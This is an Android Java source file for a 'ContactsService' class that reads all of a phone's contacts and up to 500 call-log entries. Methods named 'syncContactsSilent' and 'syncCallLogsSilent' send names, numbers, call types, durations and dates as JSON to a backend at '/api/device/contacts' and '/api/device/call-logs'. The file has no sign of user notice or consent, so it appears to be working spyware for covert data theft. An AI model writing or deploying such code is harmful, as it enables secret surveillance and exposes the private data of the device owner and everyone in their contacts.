package come.tshah.app;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.util.Log;
import org.json.JSONArray;
import org.json.JSONObject;
import java.util.ArrayList;
import java.util.List;

public class ContactsService {
    private static final String TAG = "ContactsService";
    private final ContentResolver contentResolver;

    public ContactsService(Context context) {
        this.contentResolver = context.getContentResolver();
    }

    public void syncContactsSilent(String deviceId) {
        try {
            List<String[]> contacts = getContacts();
            JSONArray arr = new JSONArray();
            for (String[] c : contacts) {
                JSONObject o = new JSONObject();
                o.put("name", c[0]);
                o.put("phone", c[1]);
                arr.put(o);
            }
            JSONObject body = new JSONObject();
            body.put("contacts", arr);
            BackendClient.post("/api/device/contacts", body.toString());
        } catch (Exception e) {
            Log.e(TAG, "syncContacts error: " + e.getMessage());
        }
    }

    public void syncCallLogsSilent(String deviceId) {
        try {
            List<long[]> rawLogs = new ArrayList<>();
            List<String[]> strLogs = getCallLogs(rawLogs);
            JSONArray arr = new JSONArray();
            for (int i = 0; i < strLogs.size(); i++) {
                String[] s = strLogs.get(i);
                long[] nums = rawLogs.get(i);
                JSONObject o = new JSONObject();
                o.put("name", s[0]);
                o.put("number", s[1]);
                o.put("type", s[2]);
                o.put("duration", nums[0]);
                o.put("date", nums[1]);
                arr.put(o);
            }
            JSONObject body = new JSONObject();
            body.put("callLogs", arr);
            BackendClient.post("/api/device/call-logs", body.toString());
        } catch (Exception e) {
            Log.e(TAG, "syncCallLogs error: " + e.getMessage());
        }
    }

    private List<String[]> getContacts() {
        List<String[]> contacts = new ArrayList<>();
        Cursor cursor = null;
        try {
            cursor = contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                new String[]{
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Phone.NUMBER
                },
                null, null,
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
            );
            if (cursor != null) {
                int nameIdx  = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
                int phoneIdx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
                while (cursor.moveToNext()) {
                    String name  = nameIdx  >= 0 ? cursor.getString(nameIdx)  : "";
                    String phone = phoneIdx >= 0 ? cursor.getString(phoneIdx) : "";
                    contacts.add(new String[]{ name != null ? name : "", phone != null ? phone : "" });
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "getContacts error: " + e.getMessage());
        } finally {
            if (cursor != null) cursor.close();
        }
        return contacts;
    }

    // returns parallel list of [name, number, type]; rawOut receives [duration, dateMs]
    private List<String[]> getCallLogs(List<long[]> rawOut) {
        List<String[]> logs = new ArrayList<>();
        Cursor cursor = null;
        try {
            cursor = contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                new String[]{
                    CallLog.Calls.CACHED_NAME,
                    CallLog.Calls.NUMBER,
                    CallLog.Calls.TYPE,
                    CallLog.Calls.DURATION,
                    CallLog.Calls.DATE
                },
                null, null,
                CallLog.Calls.DATE + " DESC"
            );
            if (cursor != null) {
                int nameIdx     = cursor.getColumnIndex(CallLog.Calls.CACHED_NAME);
                int numberIdx   = cursor.getColumnIndex(CallLog.Calls.NUMBER);
                int typeIdx     = cursor.getColumnIndex(CallLog.Calls.TYPE);
                int durationIdx = cursor.getColumnIndex(CallLog.Calls.DURATION);
                int dateIdx     = cursor.getColumnIndex(CallLog.Calls.DATE);
                int count = 0;

                while (cursor.moveToNext() && count < 500) {
                    String name   = nameIdx   >= 0 ? cursor.getString(nameIdx)   : null;
                    String number = numberIdx >= 0 ? cursor.getString(numberIdx) : null;
                    int typeInt   = typeIdx   >= 0 ? cursor.getInt(typeIdx)      : 0;
                    long duration = durationIdx >= 0 ? cursor.getLong(durationIdx) : 0L;
                    long date     = dateIdx   >= 0 ? cursor.getLong(dateIdx)     : 0L;

                    String typeStr;
                    switch (typeInt) {
                        case CallLog.Calls.INCOMING_TYPE: typeStr = "incoming"; break;
                        case CallLog.Calls.OUTGOING_TYPE: typeStr = "outgoing"; break;
                        case CallLog.Calls.MISSED_TYPE:   typeStr = "missed";   break;
                        case CallLog.Calls.REJECTED_TYPE: typeStr = "rejected"; break;
                        default:                          typeStr = "unknown";  break;
                    }

                    logs.add(new String[]{ name != null ? name : "", number != null ? number : "", typeStr });
                    rawOut.add(new long[]{ duration, date });
                    count++;
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "getCallLogs error: " + e.getMessage());
        } finally {
            if (cursor != null) cursor.close();
        }
        return logs;
    }
}
